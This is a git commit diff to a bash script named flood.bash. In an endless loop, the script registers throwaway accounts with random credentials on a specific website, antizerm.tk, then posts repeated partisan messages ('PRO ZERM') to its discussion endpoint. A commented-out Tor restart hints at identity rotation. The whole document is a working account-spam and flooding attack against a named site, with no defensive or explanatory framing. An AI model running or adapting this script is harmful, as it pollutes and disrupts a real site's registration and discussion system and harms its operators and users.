bc924ec7f46acaaf610f735afe4400e5dedf4af9
Chris <chrissx@chrissx.de>
2020-11-05 03:39:37 +0100

    changed the string because why not

--- flood.bash
+++ flood.bash
@@ -5,6 +5,6 @@ while true ; do
         rm -f tmpcookies
         lol=$RANDOM
         curl -b tmpcookies -c tmpcookies -H 'Host: antizerm.tk' -X POST -d "username=$lol&password1=$lol&password2=$lol&btn_register=Registrieren" "http://$antizermip/account/register.php"
-        curl -b tmpcookies -c tmpcookies -H 'Host: antizerm.tk' "http://$antizermip/social/ajax/load_diskussion.php?q=2&c=ZERM%20>%20AntiZERM%20$RANDOM"
+        curl -b tmpcookies -c tmpcookies -H 'Host: antizerm.tk' "http://$antizermip/social/ajax/load_diskussion.php?q=2&c=PRO%20ZERM%20$RANDOM"
         #systemctl restart tor
 done
